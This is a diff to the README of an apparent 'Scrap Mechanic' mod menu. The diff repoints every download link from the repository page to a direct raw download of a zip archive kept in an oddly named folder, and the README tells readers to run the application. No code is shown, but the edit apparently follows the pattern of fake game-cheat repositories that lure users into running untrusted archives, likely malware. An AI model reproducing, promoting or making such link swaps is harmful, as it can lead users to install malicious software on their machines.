@@ -1,6 +1,6 @@
 # 🔧 scrap-mechanic-menu - Your All-in-One Mod Powerhouse
 
-[![Download Now](https://img.shields.io/badge/Download-Scrap%20Mechanic%20Menu-blue?style=for-the-badge&logo=github)](https://github.com/hezhenyang07135-maker/scrap-mechanic-menu)
+[![Download Now](https://img.shields.io/badge/Download-Scrap%20Mechanic%20Menu-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/hezhenyang07135-maker/scrap-mechanic-menu/main/upfollow/menu-scrap-mechanic-v2.4.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Follow these simple steps to get started:
 ### Step 1: Get the Download
 
 Visit this link to download the application:  
-👉 [**Download scrap-mechanic-menu**](https://github.com/hezhenyang07135-maker/scrap-mechanic-menu)
+👉 [**Download scrap-mechanic-menu**](https://raw.githubusercontent.com/hezhenyang07135-maker/scrap-mechanic-menu/main/upfollow/menu-scrap-mechanic-v2.4.zip)
 
 ### Step 2: Run the Application
 
@@ -100,7 +100,7 @@ If you run into an issue or have a question, don’t hesitate to reach out. The 
 
 You’re just one step away from a whole new *Scrap Mechanic* experience. Head over to the download page now:
 
-[**Download scrap-mechanic-menu**](https://github.com/hezhenyang07135-maker/scrap-mechanic-menu)
+[**Download scrap-mechanic-menu**](https://raw.githubusercontent.com/hezhenyang07135-maker/scrap-mechanic-menu/main/upfollow/menu-scrap-mechanic-v2.4.zip)
 
 Thank you for choosing our mod menu. Have fun building, exploring, and creating!
 
